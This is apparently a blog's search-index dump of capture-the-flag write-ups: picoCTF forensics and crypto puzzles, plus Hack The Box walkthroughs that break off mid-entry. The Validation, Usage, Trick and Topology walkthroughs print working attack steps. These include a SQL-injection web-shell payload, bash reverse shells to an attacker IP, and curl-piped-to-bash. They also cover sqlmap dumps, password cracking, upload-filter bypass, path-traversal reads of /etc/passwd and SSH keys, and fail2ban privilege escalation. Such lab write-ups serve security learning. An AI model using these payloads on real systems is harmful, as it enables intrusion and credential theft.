jupiter.challenges.picoctf.org 19566.I connected to netcatand got this:$ nc jupiter.challenges.picoctf.org 19566c: 22247635618230338337771021174782585806381181524263873044841366299474514068058193546224093093822052165901663484246863459188458235605253463663659456395236240652573755983365987442551346855119133874929215042586088857536863074766499055411675664757288636899302650797238369258182392084458586129219175085029088626147n: 52381507515263222323599817794699622309182567234078495215000372444915188865143657734007101342711193940485970817778941170332944637755994887410208371183108504634070683215194080054898949910558738697872533090585092788459789550485992529056888975972206017849770575489601848949953696450153112859922179126086674776421e: 50456075292179024045107485813262702856921694681674584523742977428057525408224191303117327518236603004028233910382669304374294354216098467315129378153520496300403040282674275694990409924572347074884980366281158702671647939687863240236753747429310833032683088073663417411240957069795454844521722044674193519873Let’s go to dcode and enter all the given things. When it will decode it will give hex values:70 69 63 6F 43 54 46 7B 62 61 64 5F 31 64 33 61 35 5F 32 34 33 38 31 32 35 7DI know its the flag because 0x70 is p, so i went to hex to ascii converter entered the hex and got the flag:picoCTF{bad_1d3a5_2438125}" }, { "title": "wireshark-doo-dooo-do-doo from PicoCTF", "url": "/posts/Wireshark-doo-dooo-do-doo/.-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "wireshark-doo-dooo-do-doo from PicoCTFpage DescriptionCan you find the flag? shark1.pcapng.open the shark1.pcapng file and first i do is “CTRL+F” to search anything that has “pico” or “flag” in it and i found nothing.So we have to divide this messages and read their “Stream”.We can divide them with :tcp.stream eq &lt;number&gt;if we type tcp.stream eq 1 and follow their stream we get this:This gives us nothing so we search in tcp.stream eq 2 and still we find nothing till we reach tcp.stream eq 5. If we follow the stream now we get this:and here is our rot13 encoded flag:cvpbPGS{c33xno00_1_f33_h_qrnqorrs}Let’s take it to CyberChef we get the flag:picoCTF{p33kab00_1_s33_u_deadbeef}" }, { "title": "WhitePages from PicoCTF", "url": "/posts/WhitePages-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "WhitePages from PicoCTFpage DescriptionI stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank! Im using Sublime-text editor.downloaded it and i saw nothing, then i tried to copy something and i saw that it was hidden text with spaces between words. Then i tried do convert symbols to 1 and spaces to 0 and i was left with binary text like this:11110101111101101111011010001111100101101001110010010000101111001010101110111001111101011111010111110110111101101010110010111010101110101101111110101111101010101011110110110011101101101011110011011111101011011011101010111100101100001010110110111011101011001101111111011001110111111011110110111110101111001011010010111000101011011011000010101010101100011011101111011111101011011011101010101111101100001010110110101011111101011111011011110110110010101100111111001111110011111101111110111001100100001000110110011101100110101000110011011111101111101000100110011010110100111101111110101111100101101000101110001011100011001001110110001010100011011001100010010111110100111101111110101111101111101101111111001110110010101100110111001110110011001111010111110110111101101000111110010110100111001001000010111100101010111011100110000100100100011001000010001011101000001001111010010011100100111010000010001100100011111001111010011100100110101000110010100000100111101000110110011010101000001001110010001101100110101001111010001011100110101001101110100000100110101000111010001010100111101001001110100000100111001100101011001011100110011100110111001000100111001001101111001111110010101001110011001101110011101100011111000110100110011100011111001110110010111100100010011100100111001100100110011001110010101001101110011010100111011100110110011010110010101100100110000010111101011111011011110110When i tried to decode it i got nothing so i tried other way around, symbols be 0 and spaces be 1:00001010000010010000100101110000011010010110001101101111010000110101010001000110000010100000101000001001000010010101001101000101010001010010000001010000010101010100001001001100010010010100001100100000010100100100010101000011010011110101001001000100010100110010000000100110001000000100001001000001010000110100101101000111010100100100111101010101010011100100010000100000010100100100010101010000010011110101001001010100000010100000100100001001001101010011000000110000001100000010000001000110011011110111001001100010011001010111001100100000010000010111011001100101001011000010000001010000011010010111010001110100011100110110001001110101011100100110011101101000001011000010000001010000010000010010000000110001001101010011001000110001001100110000101000001001000010010111000001101001011000110110111101000011010101000100011001111011011011100110111101110100010111110110000101101100011011000101111101110011011100000110000101100011011001010111001101011111011000010111001001100101010111110110001101110010011001010110000101110100011001010110010001011111011001010111000101110101011000010110110001011111011000110011010100110100011001100011001000110111011000110110010000110000001101010110001100110010001100010011100000111001011001100011100000110001001101000011011101100011011000110011011001100110001101010110010001100101011000100011001001100101001101010011011001111101000010100000100100001001I decoded it and got this text with flag:picoCTF SEE PUBLIC RECORDS &amp; BACKGROUND REPORT 5000 Forbes Ave, Pittsburgh, PA 15213 picoCTF{not_all_spaces_are_created_equal_c54f27cd05c2189f8147cc6f5deb2e56}picoCTF{not_all_spaces_are_created_equal_c54f27cd05c2189f8147cc6f5deb2e56}" }, { "title": "WebNet0 from PicoCTF", "url": "/posts/WebNet0-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "WebNet0 from PicoCTFpage Description We found this packet capture and key. Recover the flag. HintsHow can you decrypt the TLS stream?First i asked ChatGPTand told me that i should use ssldump and thats what i did:$ ssldump -r capture.pcap -k picopico.key -dIt gave me lot of gibberish so i’m gonna paste one thing where flag is located: ---------------------------------------------------------------1 12 0.3575 (0.0004) S&gt;C application_data --------------------------------------------------------------- 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d HTTP/1.1 200 OK. 0a 44 61 74 65 3a 20 46 72 69 2c 20 32 33 20 41 .Date: Fri, 23 A 75 67 20 32 30 31 39 20 31 35 3a 35 36 3a 33 36 ug 2019 15:56:36 20 47 4d 54 0d 0a 53 65 72 76 65 72 3a 20 41 70 GMT..Server: Ap 61 63 68 65 2f 32 2e 34 2e 32 39 20 28 55 62 75 ache/2.4.29 (Ubu 6e 74 75 29 0d 0a 4c 61 73 74 2d 4d 6f 64 69 66 ntu)..Last-Modif 69 65 64 3a 20 4d 6f 6e 2c 20 31 32 20 41 75 67 ied: Mon, 12 Aug 20 32 30 31 39 20 31 36 3a 34 37 3a 30 35 20 47 2019 16:47:05 G 4d 54 0d 0a 45 54 61 67 3a 20 22 36 32 2d 35 38 MT..ETag: \"62-58 66 65 65 34 36 32 62 66 32 32 37 2d 67 7a 69 70 fee462bf227-gzip 22 0d 0a 41 63 63 65 70 74 2d 52 61 6e 67 65 73 \"..Accept-Ranges 3a 20 62 79 74 65 73 0d 0a 56 61 72 79 3a 20 41 : bytes..Vary: A 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e 67 0d 0a ccept-Encoding.. 43 6f 6e 74 65 6e 74 2d 45 6e 63 6f 64 69 6e 67 Content-Encoding 3a 20 67 7a 69 70 0d 0a 50 69 63 6f 2d 46 6c 61 : gzip..Pico-Fla 67 3a 20 70 69 63 6f 43 54 46 7b 6e 6f 6e 67 73 g: picoCTF{nongs 68 69 6d 2e 73 68 72 69 6d 70 2e 63 72 61 63 6b him.shrimp.crack 65 72 73 7d 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 ers}..Content-Le 6e 67 74 68 3a 20 31 30 30 0d 0a 4b 65 65 70 2d ngth: 100..Keep- 41 6c 69 76 65 3a 20 74 69 6d 65 6f 75 74 3d 35 Alive: timeout=5 2c 20 6d 61 78 3d 31 30 30 0d 0a 43 6f 6e 6e 65 , max=100..Conne 63 74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c 69 76 ction: Keep-Aliv 65 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a e..Content-Type: 20 74 65 78 74 2f 63 73 73 0d 0a 0d 0a 1f 8b 08 text/css....... 00 00 00 00 00 00 03 4b ca 4f a9 54 a8 e6 52 50 .......K.O.T..RP 28 48 4c 49 c9 cc 4b d7 2d c9 2f b0 52 30 2d 4a (HLI..K.-./.R0-J cd b5 e6 aa e5 d2 2b 2e 49 2c 2a 49 2d d2 2d 49 ......+.I,*I-.-I cd 2d c8 49 2c 49 45 56 6a a5 60 0c 54 a6 60 a8 .-.I,IEVj.`.T.`. 07 51 ad a0 50 92 5a 51 a2 9b 98 93 99 9e 67 a5 .Q..P.ZQ......g. 90 9c 9a 07 d4 07 32 03 00 20 cc fb a0 62 00 00 ......2.. ...b.. 00 .And there is the flag:picoCTF{nongshim.shrimp.crackers}" }, { "title": "Wpa Ing out from picoctf", "url": "/posts/WPA-ing-Out-from-PicoCTF/", "categories": "", "tags": "", "date": "2024-09-06 00:00:00 +0000", "snippet": "page DescriptionI thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the rockyou.txt credential dump.Use this ‘pcap file’ and the rockyou wordlist. The flag should be entered in the picoCTF{XXXXXX} format. HintsAircrack-ng can make a pcap file catch big air…and crack a password.Download the .pcap file and i cant find anything. Then from Hints i went to aircrack-ng GUI which i downloaded from Github. I opened It chose the .pcap file and then rockyou.txt and i let the program cook. After 1 sec there was the password:And the flag is:picoCTF{mickeymouse}" }, { "title": "Validation from HTB", "url": "/posts/Validation-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Validation from HTBnmapgave thisPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.48 ((Debian))8080/tcp open http nginxintercepting joinprocess with burpsuite + interceptwe get that after joining we receive cookie of our name in md5hashI gave name help and got : 657f8b8da628ef83cf69101b6817150anow in terminalecho -n \"help\" | md5sum657f8b8da628ef83cf69101b6817150asame thingSo the theory is that with all that usersjoining there is an sql databaseusername=help&amp;country=Brazil -- -Returned no errorso that means it is vulnerable to sql injectionturn intercept onand then send this payloadusername=help&amp;country=Brazil' UNION SELECT \"&lt;?php SYSTEM($_REQUEST['cmd']); ?&gt;\" INTO OUTFILE '/var/www/html/shell.php'-- -upload cmdDidn’t return error so that means it uploaded/shell.php?cmd=idadmin admin' or 1=1 -- - helo uid=33(www-data) gid=33(www-data) groups=33(www-data)Now get reverse shellcat reverse.sh#!/bin/bashbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/1234 0&gt;&amp;1'python3 -m http.server 8001http://10.10.11.116/shell.php?cmd=curl 10.10.16.7:8001/reverse.sh|bashUser Flag is: 4a5379b8ce73567c327cc9686e4cf4c0***www-data@validation:/var/www/html$ cat config.phpcat config.php&lt;?php $servername = \"127.0.0.1\"; $username = \"uhc\"; $password = \"uhc-9qual-global-pw\"; $dbname = \"registration\"; $conn = new mysqli($servername, $username, $password, $dbname);?&gt;```bashThere is an password which can be used for `root`www-data@validation:/var/www/html$ su -su -Password: uhc-9qual-global-pwiduid=0(root) gid=0(root) groups=0(root)```**Root Flag is: 94ba684e8cc1b2869c0b5a038b96044b**" }, { "title": "Usage from HTB", "url": "/posts/Usage-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Usage from HTBpage$ nmap -sCV --min-rate 4000 10.10.11.18Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 21:24 +04Nmap scan report for admin.usage.htb (10.10.11.18)Host is up (0.30s latency).Not shown: 960 filtered tcp ports (no-response), 38 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)|_ 256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Admin | Login|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.83 secondsSo there is a site on this IP. Search it with IP and you will get the name of the site, after that you will need to add this to /etc/hosts:10.10.11.18 admin.usage.htb usage.htbafter searching on the site you will get why you should add admin.usage.htb.***First thing you should do is open burp suite and sqlmap. Then go to usage.htb/forget-passsword and copy all the text you get in there:POST /forget-password HTTP/1.1Host: usage.htbContent-Length: 69Cache-Control: max-age=0Accept-Language: en-USUpgrade-Insecure-Requests: 1Origin: http://usage.htbContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://usage.htb/forget-passwordAccept-Encoding: gzip, deflate, brCookie: XSRF-TOKEN=eyJpdiI6ImFLY0FYSUZ1dW1TMWp2bTZ5bFl3TUE9PSIsInZhbHVlIjoibzRLeDdmR3RGQnlNaVV4amVXcFBSNnBjR1BPVmJpaXZjU2JqWHdBMlVnd0JHdGI2dEk2RGVxck1lcjlqTXNvME4rSWZVWVVqdmRjc2c3WG5pekNWNnBMWkRnUElCNjBPTlVXV2JHV24zL3NoZyt3ME9mVzZsTVltbWVaSWNaVE4iLCJtYWMiOiI4OTk0YzdkNzlmY2I2NGMzNWJlOTlmMjE3NDk1YTI1NDA2NGQ3ZDgwNGI4MWZlNzg2MjVlY2U1MTNkYjRmMzkyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImpyZG5iY2VTa2RXZVd0S2hwejljTEE9PSIsInZhbHVlIjoiNHQwK1dhc3hqOUlRSDdpczk2TlRob3Z4T2ZDQ09tc1BsZ3doL2NjbnVwaEhmZndPSjdqQWdnYUdma1RPbm1BZmZmWEhsUEFjd21PU3dBQWsyUXlFVXd1TGN2WDV1QXZraFIzNWZkbXZTRW1ibkJiN1FmSTdqWU8yeE1PK1BDUVQiLCJtYWMiOiI3MDRiYjk2ZDdlNDE3MjMzM2M5ZTk2MTcyZmVjZDE2YWM2MmE3NTI2ZDI2OTgzYzQ4MGRlZWMxMWIzMDU0ZjYyIiwidGFnIjoiIn0%3DConnection: keep-alive_token=2MSXK7VFyFajXsVOdTFVHRMcjxDh91Yno2S7aPaT&amp;email=test%40test.comI wrote this into helpfile. Which i will be using in sqlmap.sqlmapcode looks like this:sqlmap -r help -p email --level 5 --risk 3 --threads 10 --dbs --batch --random-agent-pstands for parameter and in that site parameter is email.***After 1 hour and 9 minutesof boredom you will get this databases:available databases [3]:[*] information_schema[*] performance_schema[*] usage_blogAll the information you will need is in the usage_blogdatabase. Then use this code:sqlmap -r help -p email --level 5 --risk 3 --threads 10 -D usage_blog --tables --batch --random-agentThis will show the tables inside this database:Database: usage_blog[15 tables]+------------------------+| admin_menu || admin_operation_log || admin_permissions || admin_role_menu || admin_role_permissions || admin_role_users || admin_roles || admin_user_permissions || admin_users || blog || failed_jobs || migrations || password_reset_tokens || personal_access_tokens || users |+------------------------+You will need to look inside admin_userstable where password and the username is located:User —&gt; adminPassword —&gt; ` $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 `Store this into hashes.txtand use our beloved john the ripperon this.$ john -w=/usr/share/wordlists/rockyou.txt hashes.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuswhatever1 (?)1g 0:00:00:06 DONE (2024-07-31 18:57) 0.1470g/s 243.5p/s 243.5c/s 243.5C/s alexis1..gymnasticsUse the \"--show\" option to display all of the cracked passwords reliablySession completed.Decoded password is : whatever1.Then login in as admin on this link: admin.usage.htb.After logging in you will have to change the profile with php-reverse-shell.php which will be named php.jpgbecause you can’t upload .phpfile as a profile picture. You will change that with burpsuite.$ cp php-reverse-shell.php ~/Desktop/php.jpgThen open port with NetCat:nc -nlvp 1234upload fake .jpgfile as the profile with burpsuiteand interceptis on, because you will modify php.jpgas php.phpso it will work. then you will forward it and you will get the connection on NetCat.$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.16] from (UNKNOWN) [10.10.11.18] 53114Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 16:57:42 up 6:56, 0 users, load average: 2.14, 2.25, 2.29USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=1000(dash) gid=1000(dash) groups=1000(dash)/bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'dash@usage:/$You will need this code to activate bashshell:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'After that go to dashhome directory and you can read the user.txt:ce1eaaafca460b8c56b2c5fbc6808c3dAfter that you need to search where can xander-s password be located. You will get that in dash-s home directory and to find it you will need to list all the files with:ls -allthere is file named: .monitrc where password for xanderis located:cat .monitrc#Monitoring Interval in Secondsset daemon 60#Enable Web Accessset httpd port 2812 use address 127.0.0.1 allow admin:3nc0d3d_pa$$w0rd#Apachecheck process apache with pidfile \"/var/run/apache2/apache2.pid\" if cpu &gt; 80% for 2 cycles then alert#System Monitoringcheck system usage if memory usage &gt; 80% for 2 cycles then alert if cpu usage (user) &gt; 70% for 2 cycles then alert if cpu usage (system) &gt; 30% then alert if cpu usage (wait) &gt; 20% then alert if loadavg (1min) &gt; 6 for 2 cycles then alert if loadavg (5min) &gt; 4 for 2 cycles then alert if swap usage &gt; 5% then alertcheck filesystem rootfs with path / if space usage &gt; 80% then alertafter that you can change the user:dash@usage:~$ su xandersu xanderPassword: 3nc0d3d_pa$$w0rdxander@usage:there is no flag in xander-s home directory so then it’s located into /root.We’ll need to check what permissions does xanderhave:xander@usage:~$ sudo -lsudo -lMatching Defaults entries for xander on usage: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser xander may run the following commands on usage: (ALL : ALL) NOPASSWD: /usr/bin/usage_managementI don’t know how this program works so i had to search what should i do in this moment, so i made symlinkand connected it with root.txt. It looked like this:xander@usage:/var/www/html$ touch @root.txttouch @root.txtxander@usage:/var/www/html$ ln -s /root/root.txt root.txtln -s /root/root.txt root.txtxander@usage:/var/www/html$ sudo /usr/bin/usage_managementsudo /usr/bin/usage_managementChoose an option:1. Project Backup2. Backup MySQL data3. Reset admin passwordEnter your choice (1/2/3): 117-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor (A00F11),ASM,AES-NI)Open archive: /var/backups/project.zip--Path = /var/backups/project.zipType = zipPhysical Size = 54842066Scanning the drive:WARNING: No more files86ee91210cc27a0cde61983e7f595d072984 folders, 17974 files, 113884458 bytes (109 MiB)Updating archive: /var/backups/project.zipItems to compress: 20958Files read from disk: 17974Archive size: 54842208 bytes (53 MiB)Scan WARNINGS for files and folders:86ee91210cc27a0cde61983e7f595d07 : No more files----------------Scan WARNINGS: 1And there is the root flag:86ee91210cc27a0cde61983e7f595d07" }, { "title": "Trivial-Flag-Transfer-Protocol from PicoCTF", "url": "/posts/Trivial-Flag-Transfer-Protocol-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Trivial-Flag-Transfer-Protocol from PicoCTFpage DescriptionFigure out how they moved the flag.After downloading the file i see that it’s wireshark capture file. I press “CTRL+F” and search “picoCTF” but get nothing. From the title Trivial Flag Transfer Protocol somehow i needed to figure out to filter the packets so i did research and found tftp packets in wireshark.in Wireshark i filtered out the packets: Looking at this we see that they sent files, so i have to download them like this:File –&gt; Export objects –&gt; TFTP –&gt; download all.Then locate the files and first read the Insctructions.txt$ cat instructions.txtGSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNAIt’s an rot13 encrypted text so lets go to CyberChef: TFTPDOESNTENCRYPTOURTRAFFICSOWEMUSTDISGUISEOURFLAGTRANSFER.FIGUREOUTAWAYTOHIDETHEFLAGANDIWILLCHECKBACKFORTHEPLANThis text says THE PLAN so let’s check it out:$ cat planVHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBFIt’s still rot13 encrypted text so decrypt it:*IUSEDTHEPROGRAMANDHIDITWITH-DUEDILIGENCE.CHECKOUTTHEPHOTOS***It says it used program so let’s “dpkg” it. This **Program.deb installs steghide so maybe something is hidden in photos.Let’s extract files from*picture1.bmp picture2.bmp picture3.bmp***So we will need passphrase to extract it. Let’s assume that it’s DUEDILIGENCE because **plan said it hid it with “DUEDILIGENCE”.There is 3 “.bmp” file so let’s try it on all of them.$ steghide extract -sf picture1.bmpEnter passphrase:steghide: could not extract any data with that passphrase!giorgi@darkfears31:~/Desktop/picoctf$ steghide extract -sf picture2.bmpEnter passphrase:steghide: could not extract any data with that passphrase!giorgi@darkfears31:~/Desktop/picoctf$ steghide extract -sf picture3.bmpEnter passphrase:wrote extracted data to \"flag.txt\".Here it is : “flag.txt”let’s read it and we got the flag:picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}" }, { "title": "Trick from HTB", "url": "/posts/Trick-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Trick from HTBnmapgave this:nmap -sCV --min-rate 4000 -Pn -p- 10.10.11.166Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 18:19 +04Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 0.60% doneNmap scan report for 10.10.11.166Host is up (0.088s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)| 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)|_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)| dns-nsid:|_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian80/tcp open http nginx 1.14.2|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: nginx/1.14.2Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernelWith 53port open we can use digto get site name and maybe also subdomainsdig @10.10.11.166 axfr trick.htb----------------------------preprod-payroll.trick.htb. 604800 IN\tCNAME\ttrick.htb.trick.htb.\t\t604800\tIN\tSOA\ttrick.htb. root.trick.htb. 5-----------------------------Add both of them to /etc/hosts10.10.11.166 trick.htb preprod-payroll.trick.htbThen go to preprod-payroll.trick.htbThis site is vulnerable to sql injectionswhich we can see in login pageIf you type this: username---&gt; admin' or 1=1 -- - password---&gt; 1You will get logged in. Then go to sqlmap`and read what privileges you have with:sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data=\"username=admin&amp;password=admin\" -p username --privilegesThis will display:[19:04:03] [INFO] adjusting time delay to 3 seconds due to good response times'ramo'@'localhost'[19:08:47] [INFO] fetching number of privileges for user 'remo'[19:08:47] [INFO] retrieved: 1[19:08:56] [INFO] fetching privileges for user 'remo'[19:08:56] [INFO] retrieved: FILEdatabase management system users privileges:[*] %remo% [1]: privilege: FILEThis means you can read filesThensqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data=\"username=admin&amp;password=help\" -p username --file-read=/etc/nginx/sites-enabled/default --technique=BEU --batch --level 5 --risk 3 --threads 10With this you will see all the subdomainsthat this site has.Then read the file that it says for me it was:/home/giorgi/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_defaultReading that told me that there is an preprod-marketing.trick.htbsubdomain. Add that to /etc/hosts10.10.11.166 trick.htb preprod-marketing.trick.htbFor easier way you could've used ffuf like this preprod-FUZZ.trick.htb and you would discover this subdomain.Go to that subdomain and you can see that this subdomain is more vulnerable to LFIIf you try to read /etc/passwdyou can’t with ../../../etc/passwdbecause site filters this.it should be like this ....//....//....//etc/passwd. So basically when you try to read files out of that directory it filters and removes ../. So if you want to read file in upper directory you will need to double type./index.php?page=....//....//....//....//....//....///etc/passwdOne thing is you should’ve used smtp portto upload php cmdbut when you can read id_rsafile and connect to ssheasily you will not need that.With /etc/passwdfile you get that michaelis an user. that you will connect to./index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsawith this you will get ssh keyConnect to ssh**User Flag is: 91501b7e264f89030af7e348ce858c47**sudo -lUser michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restartThen go and search fail2ban privilege escalationI found this site: https://juggernaut-sec.com/fail2ban-lpe/I changed it a bitcd /etc/fail2ban/action.dmv iptables-multiport.conf whatevercp whatever iptables-multiport.confThen change the last line to this:actionban = /tmp/shell.shThen go to /tmpand create shell.shIn shell.shtype:#!/bin/bashbash -i &gt;&amp; /dev/tcp/&lt;your_IP&gt;/&lt;port&gt; 0&gt;&amp;1Save it and go to other terminal.Try to connect to sshbut this time type wrong passwordto get banned by fail2banssh michael@trick.htbmichael@trick.htb's password:Permission denied, please try again.michael@trick.htb's password:Permission denied, please try again.michael@trick.htb's password:michael@trick.htb: Permission denied (publickey,password).................................................................................... ssh michael@trick.htbssh: connect to host trick.htb port 22: Connection refusedAfter lot of tries, finally i get bannedThen in my netcat i set up i get connection where i’m root.**Root Flag is: 74a66f08c30f51d742c4246bde0a388f**" }, { "title": "Topology from HTB", "url": "/posts/Topology-from-HTb/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Topology from HTBNmapgave this:nmap -sCV --min-rate 4000 10.10.11.217Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 14:33 +04Nmap scan report for latex.topology.htb (10.10.11.217)Host is up (0.087s latency).Not shown: 932 filtered tcp ports (no-response), 66 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)| 256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)|_ 256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Index of /|_http-server-header: Apache/2.4.41 (Ubuntu)| http-ls: Volume /| maxfiles limit reached (10)| SIZE TIME FILENAME| - 2023-01-17 12:26 demo/| 1.0K 2023-01-17 12:26 demo/fraction.png| 1.1K 2023-01-17 12:26 demo/greek.png| 1.1K 2023-01-17 12:26 demo/sqrt.png| 1.0K 2023-01-17 12:26 demo/summ.png| 3.8K 2023-06-12 07:37 equation.php| 662 2023-01-17 12:26 equationtest.aux| 17K 2023-01-17 12:26 equationtest.log| 0 2023-01-17 12:26 equationtest.out| 28K 2023-01-17 12:26 equationtest.pdf|_Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThere is some directory listing going on.Search the IPand then there is only one link. Click that:Add this to /etc/hosts:10.10.11.217 latex.topology.htbAnd access the site.It isLaTeX Equation GeneratorThen i used commands from latex injectionbut it denied saying Illegal command detected. From this https://ctan.math.illinois.edu/macros/latex/contrib/listings/listings.pdf there is a commandFinally we come to \\lstinputlisting, the command used to pretty-print stand alone files. It has one optional and one file name argument. Note that you possibly need to specify the relative path to the file. Here now the result is printed below the verbatim code since both together don’t fit the text width.\\lstinputlisting\\lstinputlisting{/etc/passwd}Doesn’t give us anything which is better than not being able to use it. So we have to format it. Reading all the directory files Nmap gave i discovered way to format it.In http://latex.topology.htb/equationtest.tex There is this command:$ \\int_{a}^b\\int_{c}^d f(x,y)dxdy $So we have to type $at the start and end.Command will look like this:$\\lstinputlisting{/etc/passwd}$And the output will be image reading the /etc/passwd file.The use of subdomains like latex.topology.htb is interesting since there could be more virtual hosts ( vHosts ) configured on this webserver. So i explored apache2file in my PCand discovered this file /etc/apache2/sites-available/000-default.conf Here is written subdomain names.$\\lstinputlisting{/etc/apache2/sites-available/000-default.conf}Will give us image where is written all the subdomain names which are: stats dev. Add that to /etc/hostsfile:10.10.11.217 stats.topology.htb dev.topology.htbhttp://dev.topology.htb/this subdomain forces me to input Username and PasswordSo there must be password and usernamesomewhere$\\lstinputlisting{/var/www/dev/.htaccess}$Tells says .htpasswd so i inspect it:$\\lstinputlisting{/var/www/dev/.htpasswd}$And i’m greeted with Username and hashed password:vdaisley $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0cracked Password is calculus20. Then went to sshand Logged in.ssh vdaisley@10.10.11.217vdaisley@10.10.11.217's password:sudo -l[sudo] password for vdaisley:Sorry, user vdaisley may not run sudo on topology.--------------------vdaisley@topology:~$ cat user.txtf9bd6f70eaff113af023f3cdcdbd090a--------------------wget http://10.10.16.2:8000/pspy64schmod +x pspy64svdaisley@topology:~$ ./pspy64s2024/08/11 07:03:01 CMD: UID=0 PID=2102 | find /opt/gnuplot -name *.plt -exec gnuplot {} ;2024/08/11 07:03:01 CMD: 